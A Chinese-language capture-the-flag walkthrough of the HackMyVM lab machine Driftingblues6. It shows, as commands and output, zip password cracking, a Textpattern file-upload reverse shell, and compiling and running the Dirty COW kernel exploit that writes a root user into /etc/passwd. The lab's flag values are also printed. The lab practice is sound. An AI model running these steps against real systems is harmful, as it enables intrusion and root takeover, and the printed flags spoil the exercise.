---
title: Driftingblues6
author: hgbe02
date: 2024-04-14
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Driftingblues6.html"
---

# driftingblues6

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427819.png" alt="image-20240412132416413" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427822.png" alt="image-20240412132504356" style="zoom: 33%;" />

## 信息搜集

### 端口扫描

```bash
rustscan -a 172.20.10.5 -- -A
```

```text
Open 172.20.10.5:80

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.2.22 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/textpattern/textpattern
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: driftingblues
```

### 目录扫描

```bash
gobuster dir -u http://172.20.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,git,jpg,txt,png
```

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.10.5
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,png,php,zip,git,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 283]
/index                (Status: 200) [Size: 750]
/db                   (Status: 200) [Size: 53656]
/db.png               (Status: 200) [Size: 53656]
/robots               (Status: 200) [Size: 110]
/robots.txt           (Status: 200) [Size: 110]
/spammer              (Status: 200) [Size: 179]
/spammer.zip          (Status: 200) [Size: 179]
/.php                 (Status: 403) [Size: 283]
/server-status        (Status: 403) [Size: 292]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished
===============================================================
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427823.png" alt="image-20240412132742826" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427824.png" alt="image-20240412132800234" style="zoom: 50%;" />

### 访问敏感目录

```apl
http://172.20.10.5/robots.txt
```

```text
User-agent: *
Disallow: /textpattern/textpattern

dont forget to add .zip extension to your dir-brute
;)
```

这么好心！可惜我已经加了，哈哈哈哈！

```apl
http://172.20.10.5/textpattern/textpattern/
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427825.png" alt="image-20240412133009395" style="zoom:50%;" />

```apl
http://172.20.10.5/db
http://172.20.10.5/db.png
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427826.png" alt="image-20240412133121984" style="zoom: 33%;" />

```apl
http://172.20.10.5/spammer
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427827.png" alt="image-20240412133212281" style="zoom:50%;" />

### 爆破zip

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427828.png" alt="image-20240412133604245" style="zoom:50%;" />

```apl
myspace4
```

查看一下：

```bash
┌──(kali💀kali)-[~/temp/driftingblues6]
└─$ unzip spammer.zip      
Archive:  spammer.zip
[spammer.zip] creds.txt password: 
 extracting: creds.txt               

┌──(kali💀kali)-[~/temp/driftingblues6]
└─$ cat creds.txt        
mayer:lionheart
```

### 尝试利用账号密码

尝试ssh登录：

```bash
┌──(kali💀kali)-[~/temp/driftingblues6]
└─$ ssh mayer@172.20.10.5                       
ssh: connect to host 172.20.10.5 port 22: Connection refused
```

忘了没开启22端口了，可能需要 knock（只是猜测），接着往下走吧：

将上面那个文件给下载一下，尝试看一下信息以及尝试提取信息：

```bash
┌──(kali💀kali)-[~/temp/driftingblues6]
└─$ wget http://172.20.10.5/db.png     
--2024-04-12 01:43:27--  http://172.20.10.5/db.png
Connecting to 172.20.10.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 53656 (52K) [image/png]
Saving to: ‘db.png’

db.png         100%[=========================================================================>]  52.40K  --.-KB/s    in 0.001s  

2024-04-12 01:43:27 (60.0 MB/s) - ‘db.png’ saved [53656/53656]

┌──(kali💀kali)-[~/temp/driftingblues6]
└─$ ls
creds.txt  db.png  hash.txt  spammer.zip  spammer.zip.tmp

┌──(kali💀kali)-[~/temp/driftingblues6]
└─$ file db.png    
db.png: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 90", progressive, precision 8, 458x458, components 3

┌──(kali💀kali)-[~/temp/driftingblues6]
└─$ exiftool db.png                                              
ExifTool Version Number         : 12.76
File Name                       : db.png
Directory                       : .
File Size                       : 54 kB
File Modification Date/Time     : 2021:03:15 09:34:46-04:00
File Access Date/Time           : 2024:04:12 01:43:38-04:00
File Inode Change Date/Time     : 2024:04:12 01:43:27-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 90.
Image Width                     : 458
Image Height                    : 458
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 458x458
Megapixels                      : 0.210

┌──(kali💀kali)-[~/temp/driftingblues6]
└─$ stegseek -wl /usr/share/wordlists/rockyou.txt db.png       
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
[i] Progress: 99.09% (132.2 MB)           
[!] error: Could not find a valid passphrase.

┌──(kali💀kali)-[~/temp/driftingblues6]
└─$ strings db.png                                      
JFIF
;CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 90
S756
U.uv
aOTh
xgxg
........
```

### 尝试登录

但是没有收获。。。等下，我们不是有个登录窗口吗？我是个sb。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427829.png" alt="image-20240412134633979" style="zoom:33%;" />

> 警告“mktime()：依赖系统的。时区设置。您需要*使用日期。时区。设置或日期默认时区set()函数。如果。使用了这些方法中的任何一种，但您仍然会收到此警告，您很可能拼错了时区标识。我们选择了。目前为时区‘UTC’，但请将Date.timezone设置为。选择您的时区。“

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427830.png" alt="image-20240412134800607" style="zoom:50%;" />

> 如果一直告警进不去，尝试切换页面再回来，就可以进去了。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427831.png" alt="image-20240412134914157" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427832.png" alt="image-20240412134926786" style="zoom:50%;" />



搜集一下CMS漏洞：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427833.png" alt="image-20240412135045532" style="zoom:50%;" />

查看一下版本号：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427834.png" alt="image-20240412135117818" style="zoom:50%;" />

正好有一个RCE漏洞，尝试利用：

```bash
┌──(kali💀kali)-[~/temp/driftingblues6]
└─$ python3 48943.py                      
Software: TextPattern <= 4.8.3
CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
Author: Michele '0blio_' Cisternino
[*] USAGE: python3 exploit.py http://target.com username password
[*] EXAMPLE: python3 exploit.py http://localhost admin admin

┌──(kali💀kali)-[~/temp/driftingblues6]
└─$ python3 48943.py http://172.20.10.5/textpattern/textpattern/ mayer lionheart
Software: TextPattern <= 4.8.3
CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
Author: Michele '0blio_' Cisternino
[*] Authenticating to the target as 'mayer'
Traceback (most recent call last):
  File "/home/kali/temp/driftingblues6/48943.py", line 122, in <module>
    "_txp_token" : (None, uploadToken), # Token here
                          ^^^^^^^^^^^
NameError: name 'uploadToken' is not defined
```

尝试文件上传的吗，我们直接上传吧：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427835.png" alt="image-20240412140131449" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427836.png" alt="image-20240412140212634" style="zoom:50%;" />

尝试访问：

```apl
http://172.20.10.5/textpattern/files/
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427838.png" alt="image-20240412140646208" style="zoom:50%;" />

看到我们的shell了，点击激活！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427839.png" alt="image-20240412140718854" style="zoom:50%;" />

弹回来了！

## 提权

### 信息搜集

```bash
(remote) www-data@driftingblues:/$ pwd 
/
(remote) www-data@driftingblues:/$ cd /var/www/html
bash: cd: /var/www/html: No such file or directory
(remote) www-data@driftingblues:/$ cd /var/
(remote) www-data@driftingblues:/var$ ls
backups  cache  get.zip  lib  local  lock  log  mail  opt  run  spool  tmp  www
(remote) www-data@driftingblues:/var$ mail
No mail for www-data
(remote) www-data@driftingblues:/var$ cd www
(remote) www-data@driftingblues:/var/www$ ls -la
total 80
drwxr-xr-x  3 root root  4096 Mar 17  2021 .
drwxr-xr-x 12 root root  4096 Mar 17  2021 ..
-rw-r--r--  1 root root 53656 Mar 15  2021 db.png
-rw-r--r--  1 root root   750 Mar 15  2021 index.html
-rw-r--r--  1 root root   110 Mar 15  2021 robots.txt
-rw-r--r--  1 root root   179 Mar 15  2021 spammer.zip
drwxr-xr-x  7 root root  4096 Sep 13  2020 textpattern
(remote) www-data@driftingblues:/var/www$ cd /home
(remote) www-data@driftingblues:/home$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Mar 17  2021 .
drwxr-xr-x 23 root root 4096 Mar 17  2021 ..
(remote) www-data@driftingblues:/home$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/exim4
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/bin/ping
/bin/mount
/bin/umount
/bin/su
/bin/ping6
(remote) www-data@driftingblues:/home$ sudo -l
bash: sudo: command not found
(remote) www-data@driftingblues:/home$ /usr/sbin/getcap -r /dev/null
bash: /usr/sbin/getcap: No such file or directory
(remote) www-data@driftingblues:/home$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
cat: /etc/cron.weekly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
(remote) www-data@driftingblues:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
(remote) www-data@driftingblues:/home$ find / -writable -type f 2>/dev/null
/var/www/textpattern/files/reverseShell.php
/proc/1/task/1/attr/current
/proc/1/task/1/attr/exec
/proc/1/task/1/attr/fscreate
........
```

一无所获，尝试进一步搜集：

```bash
(remote) www-data@driftingblues:/home$ cd /
(remote) www-data@driftingblues:/$ ls
bin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  selinux  srv  sys  tmp  usr  var  vmlinuz
(remote) www-data@driftingblues:/$ cd opt
(remote) www-data@driftingblues:/opt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Mar 17  2021 .
drwxr-xr-x 23 root root 4096 Mar 17  2021 ..
(remote) www-data@driftingblues:/opt$ cd ../tmp;ls -la
total 8
drwxrwxrwt  2 root root 4096 Apr 12 01:09 .
drwxr-xr-x 23 root root 4096 Mar 17  2021 ..
(remote) www-data@driftingblues:/tmp$ cd /usr/local
(remote) www-data@driftingblues:/usr/local$ ls -la
total 40
drwxrwsr-x 10 root staff 4096 Mar 17  2021 .
drwxr-xr-x 10 root root  4096 Mar 17  2021 ..
drwxrwsr-x  2 root staff 4096 Mar 17  2021 bin
drwxrwsr-x  2 root staff 4096 Mar 17  2021 etc
drwxrwsr-x  2 root staff 4096 Mar 17  2021 games
drwxrwsr-x  2 root staff 4096 Mar 17  2021 include
drwxrwsr-x  3 root staff 4096 Mar 17  2021 lib
lrwxrwxrwx  1 root staff    9 Mar 17  2021 man -> share/man
drwxrwsr-x  2 root staff 4096 Mar 17  2021 sbin
drwxrwsr-x  5 root staff 4096 Mar 17  2021 share
drwxrwsr-x  2 root staff 4096 Mar 17  2021 src
(remote) www-data@driftingblues:/usr/local$ cd share/
(remote) www-data@driftingblues:/usr/local/share$ ls -la
total 20
drwxrwsr-x  5 root staff 4096 Mar 17  2021 .
drwxrwsr-x 10 root staff 4096 Mar 17  2021 ..
drwxrwsr-x  2 root staff 4096 Mar 17  2021 man
drwxrwsr-x  7 root staff 4096 Mar 17  2021 sgml
drwxrwsr-x  6 root staff 4096 Mar 17  2021 xml
(remote) www-data@driftingblues:/usr/local/share$ file *
bash: file: command not found
```

### 上传pspy64以及linpeas.sh

```bash
(remote) www-data@driftingblues:/usr/local/share$ cd /tmp
(remote) www-data@driftingblues:/tmp$ 
(local) pwncat$ lpwd
/home/kali/temp/driftingblues6
(local) pwncat$ lcd ..
(local) pwncat$ upload linpeas.sh
./linpeas.sh ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 860.5/860.5 KB • ? • 0:00:00[02:15:05] uploaded 860.55KiB in 0.64 seconds                                                                                               upload.py:76
(local) pwncat$ upload pspy64
./pspy64 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 4.5/4.5 MB • 3.3 MB/s • 0:00:00[02:15:09] uploaded 4.47MiB in 1.65 seconds                                                                                                 upload.py:76
(local) pwncat$                                                                                                                                         
(remote) www-data@driftingblues:/tmp$ chmod +x *
(remote) www-data@driftingblues:/tmp$ ./linpeas.sh 


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

./linpeas.sh: 485: ./linpeas.sh: Syntax error: "fi" unexpected
(remote) www-data@driftingblues:/tmp$ ./pspy64 
Segmentation fault
```

寄。。。。查看一下内核？

```bash
(remote) www-data@driftingblues:/tmp$ uname -a
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
```

查看一下靶机发布时间：

```apl
2021-03-17
```

找一下漏洞在这之前的吧，实在不行就看wp了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427840.png" alt="image-20240412141821597" style="zoom:50%;" />

### 脏牛提权

明显这个漏洞很早了，可以尝试利用一下：

```bash
# kali
┌──(kali💀kali)-[~/temp/driftingblues6]
└─$ wget https://www.exploit-db.com/download/40839                                                                               
--2024-04-12 02:19:20--  https://www.exploit-db.com/download/40839
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5006 (4.9K) [application/txt]
Saving to: ‘40839’

40839        100%[=========================================================================>]   4.89K  --.-KB/s    in 0s      

2024-04-12 02:19:22 (288 MB/s) - ‘40839’ saved [5006/5006]

┌──(kali💀kali)-[~/temp/driftingblues6]
└─$ ls
40839  48943.py  49620.py  creds.txt  db.png  hash.txt  revershell.php  spammer.zip  spammer.zip.tmp

┌──(kali💀kali)-[~/temp/driftingblues6]
└─$ mv 40839 exp.c
```

```bash
# attacked
(remote) www-data@driftingblues:/tmp$ 
(local) pwncat$ lpwd
/home/kali/temp
(local) pwncat$ lcd driftingblues6
(local) pwncat$                                                                                                                                         
(remote) www-data@driftingblues:/tmp$ 
(local) pwncat$ upload exp.c
./exp.c ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 5.0/5.0 KB • ? • 0:00:00[02:20:09] uploaded 5.01KiB in 0.25 seconds                                                                                                 upload.py:76
(local) pwncat$                                                                                                                                         
(remote) www-data@driftingblues:/tmp$ gcc exp.c -o exp
/tmp/ccb68bKo.o: In function `generate_password_hash':
exp.c:(.text+0x1e): undefined reference to `crypt'
/tmp/ccb68bKo.o: In function `main':
exp.c:(.text+0x4cd): undefined reference to `pthread_create'
exp.c:(.text+0x501): undefined reference to `pthread_join'
collect2: error: ld returned 1 exit status
(remote) www-data@driftingblues:/tmp$ chmod +x exp.c
(remote) www-data@driftingblues:/tmp$ gcc exp.c -o exp
/tmp/ccy2hEqS.o: In function `generate_password_hash':
exp.c:(.text+0x1e): undefined reference to `crypt'
/tmp/ccy2hEqS.o: In function `main':
exp.c:(.text+0x4cd): undefined reference to `pthread_create'
exp.c:(.text+0x501): undefined reference to `pthread_join'
collect2: error: ld returned 1 exit status
```

搜一下相关方法：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427841.png" alt="image-20240412142247054" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427842.jpg" alt="VeryCapture_20240412142331" style="zoom:50%;" />

尝试按照上面的方式进行利用：

```bash
(remote) www-data@driftingblues:/tmp$ gcc exp.c -o exp -lpthread
/tmp/cc3KdcQ8.o: In function `generate_password_hash':
exp.c:(.text+0x1e): undefined reference to `crypt'
collect2: error: ld returned 1 exit status
(remote) www-data@driftingblues:/tmp$ gcc exp.c -o exp -lpthread -lcrypt
(remote) www-data@driftingblues:/tmp$ ls
exp  exp.c  linpeas.sh  pspy64
(remote) www-data@driftingblues:/tmp$ chmod +x exp
(remote) www-data@driftingblues:/tmp$ ./exp
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bash

mmap: 7ff516e18000
whoami
^C
(remote) www-data@driftingblues:/tmp$ su root
No passwd entry for user 'root'
(remote) www-data@driftingblues:/tmp$ su firefart
Password: 
firefart@driftingblues:/tmp# whoami;id
firefart
uid=0(firefart) gid=0(root) groups=0(root)
firefart@driftingblues:/tmp# cd /root
firefart@driftingblues:~# ls -la
total 24
drwx------  3 firefart root 4096 Mar 17  2021 .
drwxr-xr-x 23 firefart root 4096 Mar 17  2021 ..
drwx------  2 firefart root 4096 Mar 17  2021 .aptitude
-rw-------  1 firefart root   45 Mar 17  2021 .bash_history
-r-x------  1 firefart root   32 Mar 13  2021 root.txt
-r-x------  1 firefart root   32 Mar 13  2021 user.txt
firefart@driftingblues:~# cat .bash_history 
ls
bash logdel2 
rm logdel2 
shutdown -h now
firefart@driftingblues:~# cat .aptitude/
cat: .aptitude/: Is a directory
firefart@driftingblues:~# cat root.txt 
CCAD89B795EE7BCF7BBAD5A46F40F488firefart@driftingblues:~# cat user.txt 
5355B03AF00225CFB210AE9CA8931E51firefart@driftingblues:~# cd .aptitude/
firefart@driftingblues:~/.aptitude# ls -la
total 8
drwx------ 2 firefart root 4096 Mar 17  2021 .
drwx------ 3 firefart root 4096 Mar 17  2021 ..
-rw-r--r-- 1 firefart root    0 Mar 17  2021 config
firefart@driftingblues:~/.aptitude# cat config
firefart@driftingblues:~/.aptitude# 
```

拿到flag。。。。

做完了以后，看一下师傅们的好像都是用这个提权的，害。

## 额外收获

### Zipcracker

这是我在网上找到的破解软件，尝试一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427843.png" alt="image-20240412133743326" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404121427844.png" alt="image-20240412133929097" style="zoom:50%;" />

哈哈哈，暂时用不了，但是记录一下，万一以后有伪加密可以用一手！！！

### fcrackzip

```bash
┌──(kali💀kali)-[~/temp/driftingblues6]
└─$ fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt spammer.zip      


PASSWORD FOUND!!!!: pw == myspace4
```

